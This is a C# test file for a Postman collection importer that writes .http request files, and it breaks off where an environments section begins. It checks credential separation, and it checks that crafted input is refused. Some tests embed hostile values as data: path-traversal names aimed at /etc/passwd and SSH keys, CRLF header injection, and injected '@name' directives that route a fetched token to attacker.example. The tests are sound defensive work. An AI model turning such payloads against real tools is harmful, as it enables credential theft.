using Sling.Core.Auth;
using Sling.Core.Documents;
using Sling.Core.Parsing;
using Sling.Import.Postman;

namespace Sling.Import.Tests;

/// <summary>
/// Converting a Postman Collection v2.1 export into a folder of <c>.http</c> files.
/// </summary>
/// <remarks>
/// <para>
/// <b>The assertion that matters is not what the output looks like - it is that the output
/// parses back into the request that was meant.</b> What an importer prints is not the
/// point; whether its result is a request is. So most of what follows converts, then runs
/// <see cref="RequestDocumentParser"/> over the result and asserts against the parsed
/// document, which is the same shape M2's curl tests settled on.
/// </para>
/// <para>
/// The other half is about refusal. A collection is a file from somewhere else - downloaded,
/// forwarded, published by an API vendor - so a crafted one must not be able to write
/// structure into the document, name a request, escape the destination folder, or get a
/// credential into a file destined for a commit.
/// </para>
/// </remarks>
public sealed class PostmanImportTests
{
    private const string Schema =
        "https://schema.getpostman.com/json/collection/v2.1.0/collection.json";

    [Fact]
    public void The_simplest_collection_becomes_one_file_with_one_request()
    {
        var result = Import(Collection("Acme API", """
            {
              "name": "Get me",
              "request": { "method": "GET", "url": "https://api.example.com/me" }
            }
            """));

        Assert.True(result.Recognized);

        var file = Assert.Single(result.Files);
        Assert.Equal("acme-api.http", file.RelativePath);

        var request = Assert.Single(Parse(file).Requests);
        Assert.Equal("GET", request.Method);
        Assert.Equal("https://api.example.com/me", request.Target);
        Assert.Equal("Get me", request.Title);
    }

    [Theory]
    [InlineData("{}")]
    [InlineData("""{"hello": "world"}""")]
    [InlineData("[1, 2, 3]")]
    [InlineData("not json at all")]
    [InlineData("")]
    public void Anything_that_is_not_a_postman_export_is_refused_by_name(string json)
    {
        var result = PostmanImport.Convert("thing.json", json);

        Assert.False(result.Recognized);
        Assert.Empty(result.Files);
        Assert.NotEmpty(result.Notes);
        Assert.Contains(result.Notes, n => n.Contains("thing.json", StringComparison.Ordinal));
    }

    [Fact]
    public void A_collection_with_no_info_block_is_still_read()
    {
        var result = PostmanImport.Convert("c.json", """
            { "item": [ { "name": "Ping", "request": "https://api.example.com/ping" } ] }
            """);

        Assert.True(result.Recognized);
        Assert.Single(Parse(Assert.Single(result.Files)).Requests);
    }

    // ---- structure -------------------------------------------------------------------

    /// <summary>
    /// <c>Sling.md</c> §1: a collection becomes a folder of files, hierarchy is directories
    /// and grouping is <c>###</c> within a file.
    /// </summary>
    [Fact]
    public void Folders_become_files_and_their_children_become_directories()
    {
        var result = Import(Collection("Acme API", """
            { "name": "Root request", "request": "https://api.example.com/root" },
            {
              "name": "Orders",
              "item": [
                { "name": "List", "request": "https://api.example.com/orders" },
                { "name": "Create", "request": { "method": "POST", "url": "https://api.example.com/orders" } },
                {
                  "name": "Refunds",
                  "item": [ { "name": "List", "request": "https://api.example.com/refunds" } ]
                }
              ]
            }
            """));

        Assert.Equal(
            ["acme-api.http", "orders.http", "orders/refunds.http"],
            result.Files.Select(f => f.RelativePath).Order(StringComparer.Ordinal));

        Assert.Equal(2, Parse(File(result, "orders.http")).Requests.Count);
    }

    [Fact]
    public void A_folder_that_holds_no_requests_produces_no_file()
    {
        var result = Import(Collection("Acme", """
            { "name": "Empty", "item": [] },
            { "name": "Ping", "request": "https://api.example.com/ping" }
            """));

        Assert.Equal(["acme.http"], result.Files.Select(f => f.RelativePath));
    }

    /// <summary>
    /// The folder names come out of somebody else's JSON, so they are the one thing in the
    /// import that turns untrusted input into a location on disk.
    /// </summary>
    [Theory]
    [InlineData("../../../Windows/System32")]
    [InlineData("..\\..\\secrets")]
    [InlineData("C:\\Windows\\Temp")]
    [InlineData("..")]
    [InlineData("/etc")]
    [InlineData("a\u0000b")]
    public void A_folder_name_can_never_escape_the_destination(string name)
    {
        var result = Import(Collection("Acme", $$"""
            {
              "name": {{Quote(name)}},
              "item": [ { "name": "Ping", "request": "https://api.example.com/ping" } ]
            }
            """));

        var produced = result.Files.Select(f => f.RelativePath).ToList();

        Assert.All(produced, path =>
        {
            Assert.DoesNotContain("..", path, StringComparison.Ordinal);
            Assert.DoesNotContain("\\", path, StringComparison.Ordinal);
            Assert.DoesNotContain(":", path, StringComparison.Ordinal);
            Assert.False(path.StartsWith('/'));
        });
    }

    /// <summary>
    /// Two folders Postman treats as different are one file name to Windows, and the second
    /// silently replacing the first would be data loss inside an import.
    /// </summary>
    [Fact]
    public void Folder_names_that_collide_only_by_case_still_get_separate_files()
    {
        var result = Import(Collection("Acme", """
            { "name": "Orders", "item": [ { "name": "A", "request": "https://x.example.com/a" } ] },
            { "name": "orders", "item": [ { "name": "B", "request": "https://x.example.com/b" } ] }
            """));

        Assert.Equal(
            ["orders-2.http", "orders.http"],
            result.Files.Select(f => f.RelativePath).Order(StringComparer.Ordinal));
    }

    /// <summary>
    /// Windows resolves <c>con.http</c> as the console whatever directory it sits in.
    /// </summary>
    [Theory]
    [InlineData("CON", "_con.http")]
    [InlineData("nul", "_nul.http")]
    [InlineData("LPT1", "_lpt1.http")]
    public void A_reserved_device_name_is_escaped(string folder, string expected)
    {
        var result = Import(Collection("Acme", $$"""
            {
              "name": {{Quote(folder)}},
              "item": [ { "name": "Ping", "request": "https://x.example.com/p" } ]
            }
            """));

        Assert.Contains(expected, result.Files.Select(f => f.RelativePath), StringComparer.Ordinal);
    }

    [Fact]
    public void A_name_written_in_another_script_survives_as_a_name()
    {
        var result = Import(Collection("注文", """
            { "name": "Ping", "request": "https://x.example.com/p" }
            """));

        Assert.Equal("注文.http", Assert.Single(result.Files).RelativePath);
    }

    // ---- the request ------------------------------------------------------------------

    [Fact]
    public void A_url_object_is_assembled_when_there_is_no_raw()
    {
        var request = OneRequest("""
            {
              "name": "Search",
              "request": {
                "method": "GET",
                "url": {
                  "protocol": "https",
                  "host": ["api", "example", "com"],
                  "port": "8443",
                  "path": ["v1", "orders"],
                  "query": [
                    { "key": "limit", "value": "10" },
                    { "key": "cursor", "value": "abc", "disabled": true }
                  ]
                }
              }
            }
            """);

        Assert.Equal("https://api.example.com:8443/v1/orders?limit=10", request.Target);
    }

    [Fact]
    public void The_raw_url_wins_when_the_export_carries_one()
    {
        var request = OneRequest("""
            {
              "name": "Search",
              "request": {
                "url": { "raw": "https://api.example.com/typed", "host": ["ignored"] }
              }
            }
            """);

        Assert.Equal("https://api.example.com/typed", request.Target);
    }

    [Fact]
    public void Path_variables_are_substituted_from_the_collections_own_values()
    {
        var request = OneRequest("""
            {
              "name": "One order",
              "request": {
                "url": {
                  "raw": "https://api.example.com/orders/:id/items/:kind",
                  "variable": [ { "key": "id", "value": "42" } ]
                }
              }
            }
            """);

        // ':kind' had no value, so it is left as written rather than guessed at - which is
        // also what Postman does with an unset path variable.
        Assert.Equal("https://api.example.com/orders/42/items/:kind", request.Target);
    }

    [Fact]
    public void A_scheme_is_never_invented_in_front_of_a_variable()
    {
        var request = OneRequest("""
            { "name": "Ping", "request": "{{base_url}}/ping" }
            """);

        Assert.Equal("{{base_url}}/ping", request.Target);
    }

    [Fact]
    public void A_url_with_no_scheme_gets_https_and_says_so()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            { "name": "Ping", "request": "api.example.com/ping" }
            """)).Files);

        Assert.Equal("https://api.example.com/ping", Assert.Single(Parse(file).Requests).Target);
        Assert.Contains("https:// was assumed", file.Text, StringComparison.Ordinal);
    }

    [Fact]
    public void Disabled_headers_are_not_imported()
    {
        var request = OneRequest("""
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": [
                  { "key": "Accept", "value": "application/json" },
                  { "key": "X-Off", "value": "no", "disabled": true }
                ]
              }
            }
            """);

        Assert.Equal("Accept", Assert.Single(request.Headers).Name);
    }

    [Fact]
    public void Headers_written_as_one_raw_block_are_read_too()
    {
        var request = OneRequest("""
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": "Accept: application/json\nX-Trace: abc"
              }
            }
            """);

        Assert.Equal(["Accept", "X-Trace"], request.Headers.Select(h => h.Name));
    }

    [Fact]
    public void A_raw_json_body_arrives_with_the_content_type_postman_would_have_sent()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Create",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/orders",
                "body": {
                  "mode": "raw",
                  "raw": "{\n  \"sku\": \"A-1\"\n}",
                  "options": { "raw": { "language": "json" } }
                }
              }
            }
            """)).Files);

        var request = Assert.Single(Parse(file).Requests);

        Assert.Equal("POST", request.Method);
        Assert.Contains(request.Headers, h =>
            h.Name == "Content-Type" && h.Value == "application/json");
        Assert.Contains("\"sku\": \"A-1\"", request.LiteralText, StringComparison.Ordinal);
    }

    [Fact]
    public void An_explicit_content_type_is_not_overridden_by_the_body_mode()
    {
        var request = OneRequest("""
            {
              "name": "Create",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/orders",
                "header": [ { "key": "Content-Type", "value": "application/vnd.acme+json" } ],
                "body": { "mode": "raw", "raw": "{}", "options": { "raw": { "language": "json" } } }
              }
            }
            """);

        Assert.Equal(
            "application/vnd.acme+json",
            Assert.Single(request.Headers, h => h.Name == "Content-Type").Value);
    }

    [Fact]
    public void A_urlencoded_body_is_encoded_on_both_sides_of_the_equals()
    {
        var request = OneRequest("""
            {
              "name": "Form",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/f",
                "body": {
                  "mode": "urlencoded",
                  "urlencoded": [
                    { "key": "full name", "value": "Ada Lovelace & co" },
                    { "key": "off", "value": "x", "disabled": true }
                  ]
                }
              }
            }
            """);

        Assert.Equal("full%20name=Ada%20Lovelace%20%26%20co", request.LiteralText);
        Assert.Contains(request.Headers, h => h.Value == "application/x-www-form-urlencoded");
    }

    /// <summary>
    /// The <c>.http</c> format has no multipart syntax, so a multipart body is the body
    /// written out with a <c>&lt; ./file</c> per file part - which is what M3's import line
    /// was built for.
    /// </summary>
    [Fact]
    public void A_form_data_body_becomes_a_real_multipart_body()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Upload",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/upload",
                "body": {
                  "mode": "formdata",
                  "formdata": [
                    { "key": "caption", "value": "a photo", "type": "text" },
                    { "key": "photo", "type": "file", "src": "/Users/someone/Desktop/avatar.png" }
                  ]
                }
              }
            }
            """)).Files);

        var request = Assert.Single(Parse(file).Requests);
        var contentType = Assert.Single(request.Headers, h => h.Name == "Content-Type").Value;

        Assert.StartsWith("multipart/form-data; boundary=", contentType, StringComparison.Ordinal);

        var boundary = contentType["multipart/form-data; boundary=".Length..];

        Assert.Contains("--" + boundary, request.LiteralText, StringComparison.Ordinal);
        Assert.Contains("--" + boundary + "--", request.LiteralText, StringComparison.Ordinal);

        // RFC 2046 separates parts with CRLF, and the parser keeps each line's own
        // terminator - which is the whole reason a CRLF body can live in an LF document.
        Assert.Contains("\r\n", request.LiteralText, StringComparison.Ordinal);

        // The exporter's own absolute path is reduced to a bare file name: it does not exist
        // here, and an absolute path would be refused by the containment rule anyway.
        var import = Assert.Single(request.Body!.OfType<BodyFile>());
        Assert.Equal("./avatar.png", import.Path);
        Assert.Contains("filename=\"avatar.png\"", request.LiteralText, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("../../../etc/passwd", "./passwd")]
    [InlineData("..\\..\\id_rsa", "./id_rsa")]
    [InlineData("{{access_token}}.json", "./access_token.json")]
    [InlineData("/home/me/.ssh/id_rsa", "./id_rsa")]
    public void A_file_part_can_only_ever_name_a_file_beside_the_document(string source, string expected)
    {
        var request = OneRequest($$"""
            {
              "name": "Upload",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/u",
                "body": {
                  "mode": "formdata",
                  "formdata": [ { "key": "f", "type": "file", "src": {{Quote(source)}} } ]
                }
              }
            }
            """);

        Assert.Equal(expected, Assert.Single(request.Body!.OfType<BodyFile>()).Path);
    }

    [Fact]
    public void A_graphql_body_goes_on_the_wire_as_json()
    {
        var request = OneRequest("""
            {
              "name": "Query",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/graphql",
                "body": {
                  "mode": "graphql",
                  "graphql": {
                    "query": "query Me { me { id } }",
                    "variables": "{\"first\": 10}"
                  }
                }
              }
            }
            """);

        Assert.Contains(request.Headers, h => h.Value == "application/json");

        using var body = System.Text.Json.JsonDocument.Parse(request.LiteralText!);

        Assert.Equal("query Me { me { id } }", body.RootElement.GetProperty("query").GetString());
        Assert.Equal(10, body.RootElement.GetProperty("variables").GetProperty("first").GetInt32());
    }

    [Fact]
    public void Saved_example_responses_are_reported_rather_than_ignored()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Ping",
              "request": "https://x.example.com/p",
              "response": [ { "name": "200 OK" }, { "name": "404" } ]
            }
            """)).Files);

        Assert.Contains("2 saved example response", file.Text, StringComparison.Ordinal);
    }

    // ---- auth -------------------------------------------------------------------------

    /// <summary>
    /// <c>Sling.md</c> §5.1. An imported document is meant to be committed, so a live token
    /// found in the export has to end up in the gitignored file and nowhere else.
    /// </summary>
    [Fact]
    public void A_bearer_token_never_reaches_the_http_file()
    {
        const string Token = "ghp_a1b2c3SECRETd4e5f6";

        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "https://x.example.com/p" }
            """, auth: $$"""
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "{{Token}}" } ] },
            """));

        var document = File(result, "acme.http");

        Assert.DoesNotContain(Token, document.Text, StringComparison.Ordinal);
        Assert.Contains("Authorization: Bearer {{bearer_token}}", document.Text, StringComparison.Ordinal);

        var secrets = File(result, "http-client.private.env.json");
        Assert.Contains(Token, secrets.Text, StringComparison.Ordinal);

        // And nowhere else at all. Asserted across every file the import produced rather
        // than against http-client.env.json by name: a collection whose only variable is a
        // credential produces no committed environment file, so naming it would make this
        // pass by not finding the file it meant to check.
        Assert.All(
            result.Files.Where(f => f.RelativePath != "http-client.private.env.json"),
            f => Assert.DoesNotContain(Token, f.Text, StringComparison.Ordinal));
    }

    [Fact]
    public void Basic_credentials_are_encoded_into_the_secrets_file()
    {
        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "https://x.example.com/p" }
            """, auth: """
            "auth": {
              "type": "basic",
              "basic": [ { "key": "username", "value": "ada" }, { "key": "password", "value": "hunter2" } ]
            },
            """));

        Assert.Contains(
            "Authorization: Basic {{basic_auth}}",
            File(result, "acme.http").Text,
            StringComparison.Ordinal);

        Assert.Contains(
            System.Convert.ToBase64String("ada:hunter2"u8.ToArray()),
            File(result, "http-client.private.env.json").Text,
            StringComparison.Ordinal);
    }

    /// <summary>
    /// A Basic header is base64 of <c>user:password</c>, which cannot be assembled from
    /// variables - so the honest output is a reference that fails loudly plus a note saying
    /// what to put where.
    /// </summary>
    [Fact]
    public void Basic_auth_built_from_variables_is_named_rather_than_guessed_at()
    {
        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "https://x.example.com/p" }
            """, auth: """
            "auth": {
              "type": "basic",
              "basic": [
                { "key": "username", "value": "{{user}}" },
                { "key": "password", "value": "{{pass}}" }
              ]
            },
            """));

        var document = File(result, "acme.http");

        Assert.Contains("cannot be assembled from variables", document.Text, StringComparison.Ordinal);
        Assert.Contains("Authorization: Basic {{basic_auth}}", document.Text, StringComparison.Ordinal);

        // Deliberately not declared: an empty value would send 'Authorization: Basic' and
        // come back 401, which is a debugging session rather than an error message.
        Assert.DoesNotContain(
            result.Files,
            f => f.RelativePath.EndsWith(".env.json", StringComparison.Ordinal)
                && f.Text.Contains("basic_auth", StringComparison.Ordinal));
    }

    [Fact]
    public void An_api_key_in_the_query_string_is_carried_and_flagged()
    {
        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "https://x.example.com/p?v=1" }
            """, auth: """
            "auth": {
              "type": "apikey",
              "apikey": [
                { "key": "key", "value": "api_key" },
                { "key": "value", "value": "sk-live-9999" },
                { "key": "in", "value": "query" }
              ]
            },
            """));

        var request = Assert.Single(Parse(File(result, "acme.http")).Requests);

        Assert.Equal("https://x.example.com/p?v=1&api_key={{api_key}}", request.Target);
        Assert.Contains("logged by most servers", File(result, "acme.http").Text, StringComparison.Ordinal);
        Assert.DoesNotContain("sk-live-9999", File(result, "acme.http").Text, StringComparison.Ordinal);
    }

    /// <summary>
    /// <c>Sling.md</c> §4e - the one OAuth2 grant that survives the trip, and the reason
    /// <c># @auth oauth2</c> exists.
    /// </summary>
    [Fact]
    public void An_oauth2_client_credentials_grant_becomes_a_real_auth_block()
    {
        var result = Import(Collection("Acme", """
            { "name": "Orders", "request": "https://x.example.com/orders" }
            """, auth: """
            "auth": {
              "type": "oauth2",
              "oauth2": [
                { "key": "grant_type", "value": "client_credentials" },
                { "key": "accessTokenUrl", "value": "https://auth.example.com/oauth2/token" },
                { "key": "clientId", "value": "acme-client" },
                { "key": "clientSecret", "value": "s3cr3t-value" },
                { "key": "scope", "value": "orders.read orders.write" },
                { "key": "client_authentication", "value": "body" }
              ]
            },
            """));

        var document = File(result, "acme.http");
        var grant = Assert.Single(Parse(document).Requests).Auth;

        Assert.NotNull(grant);
        Assert.Equal("https://auth.example.com/oauth2/token", grant.TokenUrl);
        Assert.Equal("orders.read orders.write", grant.Scope);
        Assert.Equal(ClientAuthPlacement.FormBody, grant.Placement);

        // The id is not a credential and belongs in the committed file; the secret is, and
        // does not.
        Assert.DoesNotContain("s3cr3t-value", document.Text, StringComparison.Ordinal);
        Assert.Contains("acme-client", File(result, "http-client.env.json").Text, StringComparison.Ordinal);
        Assert.Contains("s3cr3t-value", File(result, "http-client.private.env.json").Text, StringComparison.Ordinal);
    }

    [Fact]
    public void Any_other_oauth2_grant_is_refused_in_as_many_words()
    {
        var result = Import(Collection("Acme", """
            { "name": "Orders", "request": "https://x.example.com/orders" }
            """, auth: """
            "auth": {
              "type": "oauth2",
              "oauth2": [
                { "key": "grant_type", "value": "authorization_code" },
                { "key": "authUrl", "value": "https://auth.example.com/authorize" }
              ]
            },
            """));

        Assert.Contains(
            "client-credentials grant only",
            File(result, "acme.http").Text,
            StringComparison.Ordinal);
    }

    /// <summary>
    /// Postman inherits auth down the tree, and an explicit "no auth" is a real answer that
    /// stops the search rather than meaning "inherit".
    /// </summary>
    [Fact]
    public void Auth_is_inherited_until_a_folder_or_request_overrides_it()
    {
        var result = Import(Collection("Acme", """
            { "name": "Root", "request": "https://x.example.com/root" },
            {
              "name": "Public",
              "auth": { "type": "noauth" },
              "item": [ { "name": "Health", "request": "https://x.example.com/health" } ]
            },
            {
              "name": "Other",
              "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "folder-token" } ] },
              "item": [ { "name": "Thing", "request": "https://x.example.com/thing" } ]
            }
            """, auth: """
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "collection-token" } ] },
            """));

        Assert.Contains("Authorization", File(result, "acme.http").Text, StringComparison.Ordinal);
        Assert.DoesNotContain("Authorization", File(result, "public.http").Text, StringComparison.Ordinal);

        var secrets = File(result, "http-client.private.env.json").Text;
        Assert.Contains("collection-token", secrets, StringComparison.Ordinal);
        Assert.Contains("folder-token", secrets, StringComparison.Ordinal);
    }

    /// <summary>
    /// <b>A request's own auth lives inside its <c>request</c> object, not on the item that
    /// holds it</b> - only a folder carries one at item level. Reading it from the item alone
    /// made an explicit <c>noauth</c> on a request do nothing, so a collection-wide bearer
    /// token was attached to the one request that had asked not to have it. Found by sending
    /// an imported document at a real server, not here.
    /// </summary>
    [Fact]
    public void A_requests_own_auth_block_overrides_the_collections()
    {
        var result = Import(Collection("Acme", """
            {
              "name": "Public",
              "request": { "url": "https://x.example.com/health", "auth": { "type": "noauth" } }
            },
            {
              "name": "Private",
              "request": {
                "url": "https://x.example.com/me",
                "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "request-token" } ] }
              }
            },
            { "name": "Inherits", "request": "https://x.example.com/thing" }
            """, auth: """
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "collection-token" } ] },
            """));

        var document = Parse(File(result, "acme.http"));

        Assert.Empty(document.Requests.Single(r => r.Title == "Public").Headers);

        Assert.Equal(
            "Bearer {{bearer_token}}",
            Assert.Single(document.Requests.Single(r => r.Title == "Private").Headers).Value);

        Assert.Equal(
            "Bearer {{bearer_token_2}}",
            Assert.Single(document.Requests.Single(r => r.Title == "Inherits").Headers).Value);

        var secrets = File(result, "http-client.private.env.json").Text;
        Assert.Contains("request-token", secrets, StringComparison.Ordinal);
        Assert.Contains("collection-token", secrets, StringComparison.Ordinal);
    }

    [Fact]
    public void One_credential_inherited_by_many_requests_becomes_one_variable()
    {
        var result = Import(Collection("Acme", """
            { "name": "A", "request": "https://x.example.com/a" },
            { "name": "B", "request": "https://x.example.com/b" },
            { "name": "C", "request": "https://x.example.com/c" }
            """, auth: """
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "one-token" } ] },
            """));

        var secrets = File(result, "http-client.private.env.json").Text;

        Assert.Equal(1, Occurrences(secrets, "one-token"));
        Assert.Equal(3, Occurrences(File(result, "acme.http").Text, "{{bearer_token}}"));
    }

    [Fact]
    public void A_value_that_is_already_a_reference_is_left_as_it_is()
    {
        var result = Import(Collection("Acme", """
            { "name": "A", "request": "https://x.example.com/a" }
            """, auth: """
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "{{my_token}}" } ] },
            """));

        Assert.Contains(
            "Authorization: Bearer {{my_token}}",
            File(result, "acme.http").Text,
            StringComparison.Ordinal);
    }

    /// <summary>
    /// "Already a reference" has to mean <em>is</em> one, not <em>contains</em> one - the
    /// looser test wrote the literal characters around the braces, which are the credential.
    /// </summary>
    [Fact]
    public void A_value_that_merely_contains_a_reference_is_still_a_credential()
    {
        var result = Import(Collection("Acme", """
            { "name": "A", "request": "https://x.example.com/a" }
            """, auth: """
            "auth": { "type": "bearer", "bearer": [ { "key": "token", "value": "LIVE{{env}}TOKEN" } ] },
            """));

        Assert.DoesNotContain("LIVE", File(result, "acme.http").Text, StringComparison.Ordinal);
        Assert.Contains("LIVE{{env}}TOKEN", File(result, "http-client.private.env.json").Text, StringComparison.Ordinal);
    }

    /// <summary>
    /// Deduplication by value alone let a client secret inherit a client id's reference when
    /// the two were equal - <c>REPLACE-ME</c> in both, which is what a published collection
    /// carries - and the id is not a credential, so the secret went into the committed file.
    /// </summary>
    [Fact]
    public void A_secret_never_inherits_a_non_secrets_variable()
    {
        var result = Import(Collection("Acme", """
            { "name": "Orders", "request": "https://x.example.com/orders" }
            """, auth: """
            "auth": {
              "type": "oauth2",
              "oauth2": [
                { "key": "grant_type", "value": "client_credentials" },
                { "key": "accessTokenUrl", "value": "https://auth.example.com/token" },
                { "key": "clientId", "value": "REPLACE-ME" },
                { "key": "clientSecret", "value": "REPLACE-ME" }
              ]
            },
            """));

        var grant = Assert.Single(Parse(File(result, "acme.http")).Requests).Auth;

        Assert.NotNull(grant);
        Assert.NotEqual(grant.ClientId, grant.ClientSecret);

        Assert.Contains("REPLACE-ME", File(result, "http-client.private.env.json").Text, StringComparison.Ordinal);
    }

    // ---- the security rules -----------------------------------------------------------

    /// <summary>
    /// <b>A description line beginning with <c>@</c> must not become a directive.</b> Written
    /// back as <c># @name login</c> it would <em>name</em> the request it sits above, and a
    /// second request's <c>Authorization: Bearer {{login.response.body.$.token}}</c> would
    /// then carry a token fetched from the real API to wherever that request points.
    /// </summary>
    [Fact]
    public void A_description_can_never_name_a_request()
    {
        var result = Import(Collection("Acme", """
            {
              "name": "Login",
              "description": "@name login\n    @name login\nOrdinary prose.",
              "request": "https://api.example.com/login"
            },
            {
              "name": "Steal",
              "request": {
                "url": "https://attacker.example/collect",
                "header": [
                  { "key": "X-Token", "value": "{{login.response.body.$.token}}" }
                ]
              }
            }
            """));

        var document = Parse(File(result, "acme.http"));

        Assert.All(document.Requests, r => Assert.Null(r.Name));
        Assert.DoesNotContain(
            document.Diagnostics,
            d => d.Message.Contains("@name", StringComparison.Ordinal)
                && d.Severity == DiagnosticSeverity.Error);
    }

    /// <summary>
    /// A script is the most obviously hostile thing in a collection. It is copied out as
    /// comments so its author can see what they have to rebuild, and nothing in it may
    /// escape the comment.
    /// </summary>
    [Fact]
    public void A_script_is_reproduced_as_comments_and_never_as_document_text()
    {
        var result = Import(Collection("Acme", """
            {
              "name": "Login",
              "event": [
                {
                  "listen": "prerequest",
                  "script": {
                    "exec": [
                      "pm.environment.set('token', 'abc');",
                      "### injected",
                      "GET https://attacker.example/steal",
                      "@name login"
                    ]
                  }
                }
              ],
              "request": "https://api.example.com/login"
            }
            """));

        var document = Parse(File(result, "acme.http"));

        // One request, not three: neither the '###' line nor the request line inside the
        // script became structure.
        var request = Assert.Single(document.Requests);
        Assert.Equal("https://api.example.com/login", request.Target);
        Assert.Null(request.Name);

        // And the script is still there to read.
        Assert.Contains("pm.environment.set", File(result, "acme.http").Text, StringComparison.Ordinal);
    }

    [Fact]
    public void A_header_value_carrying_a_line_break_cannot_add_a_header()
    {
        var request = OneRequest("""
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": [
                  { "key": "X-Trace", "value": "abc\r\nAuthorization: Bearer stolen" }
                ]
              }
            }
            """);

        var header = Assert.Single(request.Headers);

        Assert.Equal("X-Trace", header.Name);
        Assert.Equal("abcAuthorization: Bearer stolen", header.Value);
    }

    /// <summary>
    /// Stripping before checking turned <c>"Y\nZ"</c> into the token <c>YZ</c>, which passed
    /// and wrote a header the collection never described. The name is checked as written.
    /// </summary>
    [Fact]
    public void A_header_name_is_checked_as_written_and_never_repaired_into_a_valid_one()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": [ { "key": "Y\nZ", "value": "v" }, { "key": "Accept", "value": "*/*" } ]
              }
            }
            """)).Files);

        Assert.DoesNotContain("YZ:", file.Text, StringComparison.Ordinal);
        Assert.Equal("Accept", Assert.Single(Parse(file).Requests).Headers.Single().Name);
    }

    /// <summary>
    /// TargetBuilder says so about a URL and argues at length why it must; a header value is
    /// no different.
    /// </summary>
    [Fact]
    public void A_header_value_that_loses_characters_says_so()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": [ { "key": "X-Trace", "value": "abc\r\nAuthorization: Bearer stolen" } ]
              }
            }
            """)).Files);

        Assert.Contains("characters a header cannot carry", file.Text, StringComparison.Ordinal);
    }

    [Fact]
    public void A_header_name_that_is_not_a_token_is_dropped_and_named()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Ping",
              "request": {
                "url": "https://x.example.com/p",
                "header": [ { "key": "Bad Name", "value": "x" }, { "key": "Accept", "value": "*/*" } ]
              }
            }
            """)).Files);

        Assert.Equal("Accept", Assert.Single(Parse(file).Requests).Headers.Single().Name);
        Assert.Contains("is not a name a header can have", file.Text, StringComparison.Ordinal);
    }

    /// <summary>
    /// <b>A note is not a mitigation for structure injection.</b> The first version of this
    /// asserted only that the note was present, and the body was written out underneath it
    /// anyway - so the document parsed into extra requests, one of them named, and the test
    /// certified the comment while the property it stood in for did not hold. It parses the
    /// result now, which is the only assertion that could have caught it.
    /// </summary>
    [Theory]
    [InlineData("payload\n### \n# @name login\nPOST https://attacker.example/steal\nX: {{login.response.body.$.t}}")]
    [InlineData("payload\r### \r# @name login\rPOST https://attacker.example/steal")]
    public void A_body_that_would_split_the_document_is_left_out_of_it(string raw)
    {
        var file = Assert.Single(Import(Collection("Acme", $$"""
            {
              "name": "Create",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/c",
                "body": { "mode": "raw", "raw": {{Quote(raw)}} }
              }
            }
            """)).Files);

        var document = Parse(file);
        var request = Assert.Single(document.Requests);

        Assert.Equal("https://x.example.com/c", request.Target);
        Assert.Null(request.Name);
        Assert.Null(request.Body);

        Assert.Contains("line starting with ###", file.Text, StringComparison.Ordinal);

        // Still reproduced, so the body can be recovered - as comments, which is what a
        // script gets and for the same reason.
        Assert.Contains("#     payload", file.Text, StringComparison.Ordinal);

        // The Content-Type survives, because it says what the body was meant to be.
        Assert.DoesNotContain("attacker.example", document.Requests[0].Target, StringComparison.Ordinal);
    }

    [Fact]
    public void A_form_part_value_cannot_split_the_document_either()
    {
        var file = Assert.Single(Import(Collection("Acme", """
            {
              "name": "Upload",
              "request": {
                "method": "POST",
                "url": "https://x.example.com/u",
                "body": {
                  "mode": "formdata",
                  "formdata": [
                    { "key": "caption", "value": "x\r### \r# @name login\rGET https://attacker.example/", "type": "text" }
                  ]
                }
              }
            }
            """)).Files);

        var document = Parse(file);

        Assert.Single(document.Requests);
        Assert.Null(document.Requests[0].Name);
    }

    /// <summary>
    /// A lone surrogate is <em>syntactically valid JSON</em>, so the document parses and the
    /// throw arrives later, from <c>GetString</c>, past the only place a parse failure is
    /// caught. One escape sequence killed the whole import.
    /// </summary>
    [Theory]
    [InlineData("""{"info":{"name":"A\ud800","schema":"collection"},"item":[{"name":"P","request":"https://x.example.com/p"}]}""")]
    [InlineData("""{"info":{"schema":"collection"},"item":[{"name":"P","request":{"url":"https://x.example.com/\ud800"}}]}""")]
    [InlineData("""{"info":{"schema":"collection"},"item":[{"name":"P","description":"\udfff","request":"https://x.example.com/p"}]}""")]
    [InlineData("""{"name":"E","values":[{"key":"k\ud800","value":"v"}]}""")]
    public void A_lone_surrogate_anywhere_does_not_stop_the_import(string json)
    {
        var result = PostmanImport.Convert("thing.json", json);

        Assert.True(result.Recognized);
    }

    [Fact]
    public void A_url_carrying_whitespace_cannot_smuggle_a_second_token_onto_the_request_line()
    {
        var request = OneRequest("""
            {
              "name": "Ping",
              "request": { "url": "https://x.example.com/p HTTP/1.1\nGET https://attacker.example/" }
            }
            """);

        Assert.Equal("https://x.example.com/pHTTP/1.1GEThttps://attacker.example/", request.Target);
    }

    // ---- environments -------------------------------------------------------------------

    [Fact]
